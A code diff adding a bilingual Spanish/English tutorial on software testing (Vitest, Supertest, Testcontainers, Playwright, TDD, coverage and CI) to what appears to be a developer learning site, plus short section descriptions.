+    (p: string) => /[A-Z]/.test(p),
+  ];
+  return rules.every(rule => rule(password));
+}
+
+// Tests siguen pasando ✓
+\`\`\`
+
+---
+
+## Coverage: No te obsesiones
+
+### 100% coverage es una trampa
+
+\`\`\`javascript
+// Este codigo tiene 100% coverage...
+function add(a, b) {
+  return a + b;
+}
+
+// Con este test...
+test('adds numbers', () => {
+  expect(add(1, 2)).toBe(3);
+});
+
+// Pero que pasa con add('1', '2')? → '12' (bug!)
+// Coverage no garantiza calidad
+\`\`\`
+
+### Coverage util vs vanity
+
+| Tipo de codigo | Coverage recomendado |
+|----------------|---------------------|
+| Logica de negocio | 80-90% |
+| Utilidades | 90%+ |
+| UI components | 60-70% |
+| Glue code | 30-50% |
+
+---
+
+## Testing en CI/CD
+
+\`\`\`yaml
+# .github/workflows/test.yml
+name: Tests
+on: [push, pull_request]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    services:
+      postgres:
+        image: postgres:15
+        env:
+          POSTGRES_PASSWORD: test
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: 'npm'
+
+      - run: npm ci
+
+      - name: Run unit tests
+        run: npm run test:unit
+
+      - name: Run integration tests
+        run: npm run test:integration
+        env:
+          DATABASE_URL: postgres://postgres:test@localhost:5432/test
+
+      - name: Run E2E tests
+        run: npx playwright test
+
+      - name: Upload coverage
+        uses: codecov/codecov-action@v3
+\`\`\`
+
+---
+
+## Checklist de testing
+
+- [ ] Unit tests para logica de negocio (80%+ coverage)
+- [ ] Integration tests para APIs y DB
+- [ ] E2E tests para flujos criticos de usuario
+- [ ] Tests corren en CI antes de merge
+- [ ] Mocks solo para dependencias externas
+- [ ] Tests son independientes (no dependen del orden)
+- [ ] Tests son deterministicos (no flaky)
+
+---
+
+## Practica
+
+-> [Testing Fullstack con Vitest + Playwright](/es/cooking/testing-fullstack)
+-> [Testing de APIs con Testcontainers](/es/cooking/api-testing)
+
+---
+
+## Recursos
+
+- [Vitest Documentation](https://vitest.dev/)
+- [Playwright Documentation](https://playwright.dev/)
+- [Testing JavaScript - Kent C. Dodds](https://testingjavascript.com/)
+- [Test Driven Development - Kent Beck](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530)
+    `,
+    contentEn: `
+## Your safety net for changes
+
+Imagine youre a surgeon and you have to operate without anesthesia or monitors. Every cut is a risk, and you dont know if something went wrong until its too late. Programming without tests is exactly like that.
+
+> **Tests are not for finding bugs. They are for giving you the confidence to make changes without fear of breaking everything.**
+
+---
+
+## The cost of bugs
+
+| Stage where bug is found | Relative cost |
+|--------------------------|---------------|
+| During development | 1x |
+| During code review | 2x |
+| During QA | 10x |
+| In production | 100x |
+| After losing customers | 1000x |
+
+---
+
+## The testing pyramid
+
+\`\`\`
+         /\\
+        /E2E\\           Few, slow, fragile
+       /──────\\         (5% of your tests)
+      /Integration\\     Balance of cost/value
+     /──────────────\\   (15% of your tests)
+    /   Unit Tests   \\  Many, fast, stable
+   /──────────────────\\ (80% of your tests)
+\`\`\`
+
+| Type | What it tests | Speed | Fragility |
+|------|---------------|-------|-----------|
+| **Unit** | A single isolated function | ms | Very stable |
+| **Integration** | Multiple modules together | seconds | Moderate |
+| **E2E** | Complete flow as a user | minutes | Fragile |
+
+---
+
+## Unit Testing with Vitest
+
+### Basic setup
+
+\`\`\`bash
+npm install -D vitest @vitest/coverage-v8
+\`\`\`
+
+\`\`\`javascript
+// vitest.config.ts
+import { defineConfig } from 'vitest/config';
+
+export default defineConfig({
+  test: {
+    globals: true,
+    environment: 'node',
+    coverage: {
+      provider: 'v8',
+      reporter: ['text', 'html'],
+    },
+  },
+});
+\`\`\`
+
+### AAA Pattern (Arrange, Act, Assert)
+
+\`\`\`javascript
+// src/utils/price.ts
+export function calculateTotal(items: Item[], taxRate: number): number {
+  const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
+  return subtotal * (1 + taxRate);
+}
+
+// src/utils/price.test.ts
+import { describe, it, expect } from 'vitest';
+import { calculateTotal } from './price';
+
+describe('calculateTotal', () => {
+  it('calculates total with tax', () => {
+    // Arrange - Prepare data
+    const items = [
+      { price: 100, quantity: 2 },
+      { price: 50, quantity: 1 },
+    ];
+    const taxRate = 0.16;
+
+    // Act - Execute function
+    const result = calculateTotal(items, taxRate);
+
+    // Assert - Verify result
+    expect(result).toBe(290); // (200 + 50) * 1.16 = 290
+  });
+
+  it('returns 0 for empty cart', () => {
+    expect(calculateTotal([], 0.16)).toBe(0);
+  });
+
+  it('handles 0 tax rate', () => {
+    const items = [{ price: 100, quantity: 1 }];
+    expect(calculateTotal(items, 0)).toBe(100);
+  });
+});
+\`\`\`
+
+### Mocking: When and how
+
+\`\`\`javascript
+// src/services/user.ts
+import { db } from './database';
+import { sendEmail } from './email';
+
+export async function createUser(email: string, name: string) {
+  const user = await db.user.create({ data: { email, name } });
+  await sendEmail(email, 'Welcome!', \`Hello \${name}\`);
+  return user;
+}
+
+// src/services/user.test.ts
+import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { createUser } from './user';
+import { db } from './database';
+import { sendEmail } from './email';
+
+// Mock external modules
+vi.mock('./database', () => ({
+  db: {
+    user: {
+      create: vi.fn(),
+    },
+  },
+}));
+
+vi.mock('./email', () => ({
+  sendEmail: vi.fn(),
+}));
+
+describe('createUser', () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+  });
+
+  it('creates user and sends email', async () => {
+    // Arrange
+    const mockUser = { id: 1, email: 'test@example.com', name: 'Test' };
+    vi.mocked(db.user.create).mockResolvedValue(mockUser);
+    vi.mocked(sendEmail).mockResolvedValue(undefined);
+
+    // Act
+    const result = await createUser('test@example.com', 'Test');
+
+    // Assert
+    expect(db.user.create).toHaveBeenCalledWith({
+      data: { email: 'test@example.com', name: 'Test' },
+    });
+    expect(sendEmail).toHaveBeenCalledWith(
+      'test@example.com',
+      'Welcome!',
+      'Hello Test'
+    );
+    expect(result).toEqual(mockUser);
+  });
+});
+\`\`\`
+
+---
+
+## Integration Testing
+
+### API Testing with Supertest
+
+\`\`\`javascript
+// src/app.test.ts
+import { describe, it, expect, beforeAll, afterAll } from 'vitest';
+import request from 'supertest';
+import { app } from './app';
+import { db } from './database';
+
+describe('API /users', () => {
+  beforeAll(async () => {
+    // Setup: clean and populate test DB
+    await db.user.deleteMany();
+    await db.user.create({
+      data: { email: 'existing@test.com', name: 'Existing' },
+    });
+  });
+
+  afterAll(async () => {
+    await db.$disconnect();
+  });
+
+  it('GET /users returns list of users', async () => {
+    const response = await request(app)
+      .get('/users')
+      .expect('Content-Type', /json/)
+      .expect(200);
+
+    expect(response.body).toHaveLength(1);
+    expect(response.body[0].email).toBe('existing@test.com');
+  });
+
+  it('POST /users creates new user', async () => {
+    const response = await request(app)
+      .post('/users')
+      .send({ email: 'new@test.com', name: 'New User' })
+      .expect(201);
+
+    expect(response.body.email).toBe('new@test.com');
+  });
+
+  it('POST /users with duplicate email returns 400', async () => {
+    const response = await request(app)
+      .post('/users')
+      .send({ email: 'existing@test.com', name: 'Duplicate' })
+      .expect(400);
+
+    expect(response.body.error).toContain('already exists');
+  });
+});
+\`\`\`
+
+### Testcontainers: Real databases
+
+\`\`\`javascript
+// src/db.test.ts
+import { describe, it, expect, beforeAll, afterAll } from 'vitest';
+import { PostgreSqlContainer } from '@testcontainers/postgresql';
+import { PrismaClient } from '@prisma/client';
+
+describe('Database Integration', () => {
+  let container;
+  let prisma;
+
+  beforeAll(async () => {
+    // Start real PostgreSQL container
+    container = await new PostgreSqlContainer()
+      .withDatabase('testdb')
+      .start();
+
+    // Connect Prisma to the container
+    prisma = new PrismaClient({
+      datasources: {
+        db: { url: container.getConnectionUri() },
+      },
+    });
+
+    // Run migrations
+    await prisma.$executeRaw\`CREATE TABLE users (id SERIAL, email TEXT, name TEXT)\`;
+  }, 60000); // Long timeout to start container
+
+  afterAll(async () => {
+    await prisma.$disconnect();
+    await container.stop();
+  });
+
+  it('inserts and reads user from real PostgreSQL', async () => {
+    await prisma.$executeRaw\`INSERT INTO users (email, name) VALUES ('test@db.com', 'DB Test')\`;
+
+    const users = await prisma.$queryRaw\`SELECT * FROM users WHERE email = 'test@db.com'\`;
+
+    expect(users).toHaveLength(1);
+    expect(users[0].name).toBe('DB Test');
+  });
+});
+\`\`\`
+
+---
+
+## E2E Testing with Playwright
+
+### Setup
+
+\`\`\`bash
+npm init playwright@latest
+\`\`\`
+
+### Basic E2E test
+
+\`\`\`javascript
+// e2e/login.spec.ts
+import { test, expect } from '@playwright/test';
+
+test.describe('Login Flow', () => {
+  test('user can log in', async ({ page }) => {
+    // Navigate to the page
+    await page.goto('/login');
+
+    // Fill form
+    await page.fill('[data-testid="email"]', 'user@example.com');
+    await page.fill('[data-testid="password"]', 'password123');
+
+    // Click submit
+    await page.click('[data-testid="submit"]');
+
+    // Verify redirect to dashboard
+    await expect(page).toHaveURL('/dashboard');
+    await expect(page.locator('h1')).toContainText('Welcome');
+  });
+
+  test('shows error with invalid credentials', async ({ page }) => {
+    await page.goto('/login');
+
+    await page.fill('[data-testid="email"]', 'wrong@example.com');
+    await page.fill('[data-testid="password"]', 'wrongpass');
+    await page.click('[data-testid="submit"]');
+
+    // Verify error message
+    await expect(page.locator('[data-testid="error"]')).toBeVisible();
+    await expect(page.locator('[data-testid="error"]')).toContainText('Invalid credentials');
+  });
+});
+\`\`\`
+
+### Page Object Pattern
+
+\`\`\`javascript
+// e2e/pages/LoginPage.ts
+import { Page, Locator } from '@playwright/test';
+
+export class LoginPage {
+  readonly page: Page;
+  readonly emailInput: Locator;
+  readonly passwordInput: Locator;
+  readonly submitButton: Locator;
+  readonly errorMessage: Locator;
+
+  constructor(page: Page) {
+    this.page = page;
+    this.emailInput = page.locator('[data-testid="email"]');
+    this.passwordInput = page.locator('[data-testid="password"]');
+    this.submitButton = page.locator('[data-testid="submit"]');
+    this.errorMessage = page.locator('[data-testid="error"]');
+  }
+
+  async goto() {
+    await this.page.goto('/login');
+  }
+
+  async login(email: string, password: string) {
+    await this.emailInput.fill(email);
+    await this.passwordInput.fill(password);
+    await this.submitButton.click();
+  }
+}
+
+// e2e/login.spec.ts (using Page Object)
+import { test, expect } from '@playwright/test';
+import { LoginPage } from './pages/LoginPage';
+
+test('successful login', async ({ page }) => {
+  const loginPage = new LoginPage(page);
+  await loginPage.goto();
+  await loginPage.login('user@example.com', 'password123');
+
+  await expect(page).toHaveURL('/dashboard');
+});
+\`\`\`
+
+---
+
+## TDD: Test Driven Development
+
+### The Red-Green-Refactor cycle
+
+\`\`\`
+┌──────────┐     ┌──────────┐     ┌──────────┐
+│   RED    │ ──→ │  GREEN   │ ──→ │ REFACTOR │ ──┐
+│          │     │          │     │          │   │
+│ Write    │     │ Write    │     │ Improve  │   │
+│ a test   │     │ minimum  │     │ code     │   │
+│ that     │     │ code to  │     │ without  │   │
+│ fails    │     │ pass     │     │ breaking │   │
+│          │     │          │     │ tests    │   │
+└──────────┘     └──────────┘     └──────────┘   │
+     ↑                                           │
+     └───────────────────────────────────────────┘
+\`\`\`
+
+### TDD Example: Password validator
+
+\`\`\`javascript
+// Step 1: RED - Failing test
+// password.test.ts
+describe('validatePassword', () => {
+  it('rejects password shorter than 8 characters', () => {
+    expect(validatePassword('short')).toBe(false);
+  });
+});
+
+// validatePassword doesnt exist yet → test fails ✓
+
+// Step 2: GREEN - Minimum code
+// password.ts
+export function validatePassword(password: string): boolean {
+  return password.length >= 8;
+}
+
+// Test passes ✓
+
+// Step 3: RED - New requirement
+it('rejects password without uppercase letters', () => {
+  expect(validatePassword('lowercase123')).toBe(false);
+});
+
+// Test fails ✓
+
+// Step 4: GREEN
+export function validatePassword(password: string): boolean {
+  if (password.length < 8) return false;
+  if (!/[A-Z]/.test(password)) return false;
+  return true;
+}
+
+// Step 5: REFACTOR
+export function validatePassword(password: string): boolean {
+  const rules = [
+    (p: string) => p.length >= 8,
+    (p: string) => /[A-Z]/.test(p),
+  ];
+  return rules.every(rule => rule(password));
+}
+
+// Tests still pass ✓
+\`\`\`
+
+---
+
+## Coverage: Dont obsess
+
+### 100% coverage is a trap
+
+\`\`\`javascript
+// This code has 100% coverage...
+function add(a, b) {
+  return a + b;
+}
+
+// With this test...
+test('adds numbers', () => {
+  expect(add(1, 2)).toBe(3);
+});
+
+// But what about add('1', '2')? → '12' (bug!)
+// Coverage doesnt guarantee quality
+\`\`\`
+
+### Useful coverage vs vanity
+
+| Code type | Recommended coverage |
+|-----------|---------------------|
+| Business logic | 80-90% |
+| Utilities | 90%+ |
+| UI components | 60-70% |
+| Glue code | 30-50% |
+
+---
+
+## Testing in CI/CD
+
+\`\`\`yaml
+# .github/workflows/test.yml
+name: Tests
+on: [push, pull_request]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    services:
+      postgres:
+        image: postgres:15
+        env:
+          POSTGRES_PASSWORD: test
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: 'npm'
+
+      - run: npm ci
+
+      - name: Run unit tests
+        run: npm run test:unit
+
+      - name: Run integration tests
+        run: npm run test:integration
+        env:
+          DATABASE_URL: postgres://postgres:test@localhost:5432/test
+
+      - name: Run E2E tests
+        run: npx playwright test
+
+      - name: Upload coverage
+        uses: codecov/codecov-action@v3
+\`\`\`
+
+---
+
+## Testing checklist
+
+- [ ] Unit tests for business logic (80%+ coverage)
+- [ ] Integration tests for APIs and DB
+- [ ] E2E tests for critical user flows
+- [ ] Tests run in CI before merge
+- [ ] Mocks only for external dependencies
+- [ ] Tests are independent (dont depend on order)
+- [ ] Tests are deterministic (not flaky)
+
+---
+
+## Practice
+
+-> [Fullstack Testing with Vitest + Playwright](/en/cooking/testing-fullstack)
+-> [API Testing with Testcontainers](/en/cooking/api-testing)
+
+---
+
+## Resources
+
+- [Vitest Documentation](https://vitest.dev/)
+- [Playwright Documentation](https://playwright.dev/)
+- [Testing JavaScript - Kent C. Dodds](https://testingjavascript.com/)
+- [Test Driven Development - Kent Beck](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530)
+    `,
+  },
 }
 
 // Mapear slugs alternativos
@@ -10975,6 +13979,8 @@ const sectionDescriptions: Record<string, { es: string; en: string }> = {
   redis: { es: 'Redis: cache en memoria, sesiones, pub/sub y estructuras de datos rápidas.', en: 'Redis: in-memory cache, sessions, pub/sub and fast data structures.' },
   'docker-compose': { es: 'Docker Compose: orquestación de múltiples contenedores, redes y volúmenes.', en: 'Docker Compose: orchestration of multiple containers, networks and volumes.' },
   cicd: { es: 'CI/CD con GitHub Actions: automatiza tests, builds y deploys de tu código.', en: 'CI/CD with GitHub Actions: automate tests, builds and deploys of your code.' },
+  testing: { es: 'Testing profesional: unit, integration, E2E con Vitest y Playwright. TDD, mocking y cobertura.', en: 'Professional testing: unit, integration, E2E with Vitest and Playwright. TDD, mocking and coverage.' },
+  observability: { es: 'Observabilidad: logs, metricas y traces con Prometheus, Grafana, OpenTelemetry y Jaeger.', en: 'Observability: logs, metrics and traces with Prometheus, Grafana, OpenTelemetry and Jaeger.' },
   mobile: { es: 'React Native y Expo: desarrollo de apps móviles multiplataforma con JavaScript.', en: 'React Native and Expo: cross-platform mobile app development with JavaScript.' },
   iot: { es: 'IoT con Arduino y ESP32: sensores, actuadores y proyectos de electrónica.', en: 'IoT with Arduino and ESP32: sensors, actuators and electronics projects.' },
   'vector-db': { es: 'Bases de datos vectoriales: Qdrant, pgvector, Pinecone para búsqueda semántica.', en: 'Vector databases: Qdrant, pgvector, Pinecone for semantic search.' },
@@ -10982,6 +13988,7 @@ const sectionDescriptions: Record<string, { es: string; en: string }> = {
   mcp: { es: 'MCP (Model Context Protocol): herramientas y extensiones para LLMs de Anthropic.', en: 'MCP (Model Context Protocol): tools and extensions for Anthropic LLMs.' },
   agents: { es: 'Agentes IA autónomos: LangChain, AutoGen, CrewAI. Crea agentes que ejecutan tareas.', en: 'Autonomous AI agents: LangChain, AutoGen, CrewAI. Create agents that execute tasks.' },
   vision: { es: 'Vision y Multimodal: procesamiento de imágenes y video con IA. OCR, clasificación, detección.', en: 'Vision and Multimodal: image and video processing with AI. OCR, classification, detection.' },
+  security: { es: 'Seguridad de aplicaciones web: OWASP Top 10, SQL Injection, XSS, CSRF, autenticación segura y headers de seguridad.', en: 'Web application security: OWASP Top 10, SQL Injection, XSS, CSRF, secure authentication and security headers.' },
 }
 
 export async function generateMetadata({ params }: { params: Promise<{ locale: string; section: string }> }): Promise<Metadata> {
